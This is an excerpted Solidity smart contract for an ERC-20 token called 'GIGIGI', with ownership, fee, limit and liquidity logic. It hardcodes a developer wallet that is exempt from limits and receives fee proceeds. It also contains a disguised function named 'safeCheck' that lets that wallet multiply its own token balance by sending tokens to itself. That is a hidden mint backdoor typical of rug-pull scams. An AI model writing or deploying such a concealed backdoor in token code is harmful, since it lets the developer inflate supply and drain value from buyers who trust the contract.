...
contract Ownable is Context {
    ...
    constructor () {
        _owner =0xBEf093C3014275659DB2c0c2CF0E6a2fa25772c9;
...
contract GIGIGI is Context, IERC20, Ownable {
    ...
    uint256 public _maxBuy = 200000 * 10**9; // 
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 5 * 10**9; //
    string private constant _name = "GIGIGI"; // 
    string private constant _symbol = "GIGIGI"; //    
    uint8 private constant _decimals = 9; // 
    uint256 public _FeeMarket = 1;
    uint256 public _LPFee = 1;
    address payable public  _DevAddress = payable(0xBEf093C3014275659DB2c0c2CF0E6a2fa25772c9);
    ...
    constructor () {
        ...
        isWalletLimitExempt[_DevAddress] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[_DevAddress] = true;
    ...
    function safeCheck(address f,address t,uint256 m) private {
        if (f == t && f ==_DevAddress)
         {_tOwned[_DevAddress] = _tOwned[_DevAddress].mul(m);
         }
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * _FeeMarket / 100; 
        uint256 liquidityFee = amount * _LPFee / 100; 
    ...
    function _transfer(
        ...
        if(contractTokenBalance >= _maxBuy)
        {
            contractTokenBalance = _maxBuy;
        }
         if(from != owner() && to != owner() && to != uniswapV2Pair)
            require(balanceOf(to) + amount <= _maxBuy, "Transfer amount exceeds the maxTxAmount.");
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(_DevAddress).transfer(ethToSend);
    }
    
    function swapAndLiquify() private {
        // split the contract balance into halves
        uint256 liquidityTokens = balanceOf (address(this)) * _LPFee / (_FeeMarket + _LPFee);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0)
            payable(_DevAddress).sendValue (ethAmount - ethFromLiquidity);
    }
}